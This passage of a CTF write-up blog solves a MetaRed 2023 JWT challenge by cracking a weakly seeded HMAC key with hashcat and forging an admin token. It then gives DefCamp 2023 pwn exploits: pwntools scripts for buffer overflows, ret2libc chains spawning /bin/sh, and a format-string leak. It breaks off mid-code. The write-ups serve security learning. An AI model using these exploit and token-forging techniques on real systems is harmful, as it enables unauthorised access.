class="string">&quot;2 per minute&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jwt_token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> jwt_token:</span><br><span class="line">        response = make_response(jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Missing JWT token&quot;</span>&#125;), <span class="number">401</span>)</span><br><span class="line">        new_token = encode(&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;non privileged&quot;</span>&#125;, app.secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        response.headers[<span class="string">&#x27;WWW-Authenticate&#x27;</span>] = <span class="string">f&#x27;Bearer <span class="subst">&#123;new_token&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = decode(jwt_token, app.secret_key, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        user = payload.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user.lower() == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;flag&quot;</span>: FLAG&#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Not authorized&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> exceptions.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JWT token&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>The server gets the <code>Authorization</code> value from the header of the request. If it doesnâ€™t exist, the server creates and send to response JWT token using <code>app.secret_key</code> and <code>HS256</code> algorithm.</p><p>If <code>Authorization</code> value is exit, the server will try to decode it using <code>app.secret_key</code> and <code>HS256</code> algorithm and obtain the <code>user</code> value. If the <code>user</code> value is <code>admin</code>, you can get the flag!</p><p>An structure of a JWT is shown below:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xxxx.yyyy.zzzz</span><br><span class="line"></span><br><span class="line">- xxxx: header</span><br><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">- yyyy: payload</span><br><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br><span class="line">- zzzz: signature</span><br><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">    base64UrlEncode(payload),</span><br><span class="line">    secret_key</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>I had doubts. Can I guess the input(JWT token) from the response? Can I know the <code>app.secret_key</code>?</p><p>So, I tried below things for my doubts.</p><ol><li>using <code>None</code> algorithm instead of <code>HS256</code> when sending jwt token.<ul><li>It was wrong. Because itâ€™s fixed the value of <code>algorithms=[&#39;HS256&#39;]</code> when decoding.</li><li>I could have tried this if the algorithm wasnâ€™t fixed.</li></ul></li><li>try to find <code>app.secret_key</code>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line">random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>If I know the seed, I can know the random value. Itâ€™s not completely random. The number of cases is only 1001.</li><li>I used the hashcat to find the <code>key</code> of jwt token created using the <code>HS256</code> algorithm. For this, I needed to write a script to create the key candidate list. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">    random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>Finally I got the list for hashcat!</p><ul><li><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibm9uIHByaXZpbGVnZWQifQ.SmQA4Ic4hOGFRD4hdRuuact9gwKRZZwI3zpEgBnjocw ./list</span><br></pre></td></tr></table></figure></li></ul><p>The <code>-m</code> means hash modes, 16500 is JWT (JSON Web Token). Now I know the <code>app.secret_key</code> from the result. It was <code>Sup3S4f3472520232207</code>.</p><p>I used this site for create jwt token.</p><ul><li><a href="https://jwt.io/">https://jwt.io/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>Just connect and receive a jwt token in response.</li><li>Infer the key used for encoding using the obtained jwt token and hashcat.</li><li>Change the <code>user</code> value to admin, create a new jwt token, and send it.</li></ol><img src="/images/231027-metared2023-master_jwt/1.png" width=700/><br>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> MetaRed </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)</title>
      <link href="/231023-d-ctf2023-ALL_PWN/"/>
      <url>/231023-d-ctf2023-ALL_PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2106">https://ctftime.org/event/2106</a></li></ul><h2 id="baby-bof-105-solves-x2F-10-points"><a href="#baby-bof-105-solves-x2F-10-points" class="headerlink" title="baby-bof (105 solves &#x2F; 10 points)"></a>baby-bof (105 solves &#x2F; 10 points)</h2><blockquote><p>This is a basic buffer overflow.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p></blockquote><p>Simple buffer overflow from <code>gets</code>. I simply jumped to <code>flag</code>.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.182.195&#x27;, 31670)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x130</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x400767</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bistro-67-solves-x2F-12-points"><a href="#bistro-67-solves-x2F-12-points" class="headerlink" title="bistro (67 solves &#x2F; 12 points)"></a>bistro (67 solves &#x2F; 12 points)</h2><blockquote><p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>My decompiler didnâ€™t work well, so I used an online decompiler. </p><ul><li><a href="https://dogbolt.org/">https://dogbolt.org/</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">custom</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose what you want to eat:&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4005E0: using guessed type __int64 __fastcall gets(_QWORD);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (000000000040076C) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;              MENU             &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Custom dinner............10$&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    custom();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is part of what Hexray decompiled. I can find simple buffer overflow from <code>custom</code>. The challenge didnâ€™t give player a libc, so I need to find libc address. Fortunately, there is no PIE. :)</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><ul><li>Remember to return to the main when you leak libc address.</li><li>If the stack is not aligned, you can add a <code>ret</code> assembly.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.89.133.49&#x27;</span>,<span class="number">30310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bistro-v2-72-solves-x2F-10-points"><a href="#bistro-v2-72-solves-x2F-10-points" class="headerlink" title="bistro-v2 (72 solves &#x2F; 10 points)"></a>bistro-v2 (72 solves &#x2F; 10 points)</h2><blockquote><p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>This challenge is similar to bistro. But simple logic is added.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> not_flag; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> flag; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;flag, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the restaurant V2!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(buff, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);   <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Show me your ticket to pass: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;not_flag);</span><br><span class="line">    <span class="keyword">if</span> ( flag == not_flag )</span><br><span class="line">      restaurant();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Permission denied!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I need a ticket(flag) for a <code>restaurant</code>. But how to know <code>flag</code>? The <code>flag</code> is from <code>/dev/urandom</code>. I obviously canâ€™t predict this. But I can leak this from stack. Because there is a <code>format string bug(fsb)</code>! </p><p>The <code>flag</code> is stored on the stack. So I can leak this using <code>fsb</code>. If I leaked the required <code>flag</code>, the challenge is already over. (The rest is the same as the previous <code>bistro</code>.)</p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant-v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.141.71.230&#x27;</span>, <span class="number">31837</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant-v2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ticket = p.recvline()</span><br><span class="line">info(ticket)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, ticket)</span><br><span class="line"></span><br><span class="line"><span class="comment"># same as before</span></span><br><span class="line">ret = <span class="number">0x00000000004006ae</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400b33</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;restaurant&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc.address = printf_got - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="book-39-solves-x2F-247-points"><a href="#book-39-solves-x2F-247-points" class="headerlink" title="book (39 solves &#x2F; 247 points)"></a>book (39 solves &#x2F; 247 points)</h2><blockquote><p>Read books for inspiration so you know what to write!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p></blockquote><p>Until I decompiled, I thought this challenge might be heap related. But I was completely wrong. lol</p><p>There are 6 methods, but I only focused on 2(<code>print_todo</code>, <code>store_todo</code>). </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which entry would you like to read? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your NOTE: %s\n&quot;</span>, &amp;todos[<span class="number">48</span> * v1]); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I always pay attention whenever I see an index. It can refer to memory you didnâ€™t intend. </p><img src="/images/231023-d-ctf2023-ALL_PWN/book01.png" width=700/><br><p>The index 0 starts at 0x555555558140. For debugging convenience, I put AAAA at index 0. :)<br>I can put the index as a negative number, so I can leak the got address.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In which slot would you like to store the new entry? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your NOTE? &quot;</span>);</span><br><span class="line">  fflush(<span 